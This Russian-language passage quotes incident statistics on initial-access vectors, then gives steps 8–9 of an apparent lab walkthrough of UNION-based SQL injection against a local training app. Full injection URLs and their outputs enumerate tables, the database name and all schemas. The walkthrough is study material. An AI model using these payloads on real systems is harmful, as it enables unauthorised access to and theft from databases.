Было проанализировано и обработано около 4875 инцидентов, данные актуальны на июль 2024 - июнь 2025.
В отчёте показывается, что эксплуатация уязвимостей - это одно из основных векторов начального проникновения: 21,3%. Для сравнения, фишинг - около 60%, ботнеты - 9,9%, вредоносные приложения - 8%, инсайдерские угрозы - 0,8%.

Почти 70% случаев эксплуатации уязвимостей приводят к успешному вторжению (по сравнению с 27% у фишинга). А также в 68% случаев эксплуатация уязвимостей приводит к загрузке вредоносного кода.

8) Так, сейчас узнаем информацию о таблицах в бд.
Опять пошел поресерчил в интернете как это сделать, есть разные способы, но я возьму перебор таблиц через LIMIT
```
http://localhost:8080/task/?id=-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--+
```
Выводим нам
```
Ваш id:1  
Ваш логин:emails
```
Далее меняем LIMIT на 1,1
```
http://localhost:8080/task/?id=-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1--+
```
Выводит
```
Ваш id:1  
Ваш логин:users
```
Далее
```
http://localhost:8080/task/?id=-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1--+
```
Выдает уже пустую страницу, значит у нас всего 2 таблицы - emails, users

9) Также ради прикола узнаем, как называется бд
```
http://localhost:8080/task/?id=-1' UNION SELECT 1,database(),3--+```
```

```
Ваш id:1  
Ваш логин:security
```
Имя бд - security
А еще узнаем какие бд вообще есть у нас
```
http://localhost:8080/task/?id=-1' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--+
```

```
Ваш id:1  
Ваш логин:information_schema,mysql,performance_schema,security,sys
```
Ничего интересного:
- `information_schema` - системная, структура БД
- `mysql` - системная, настройки MySQL
- `performance_schema` - системная, метрики
- `sys` - системная
-  **`security`** - как раз наша
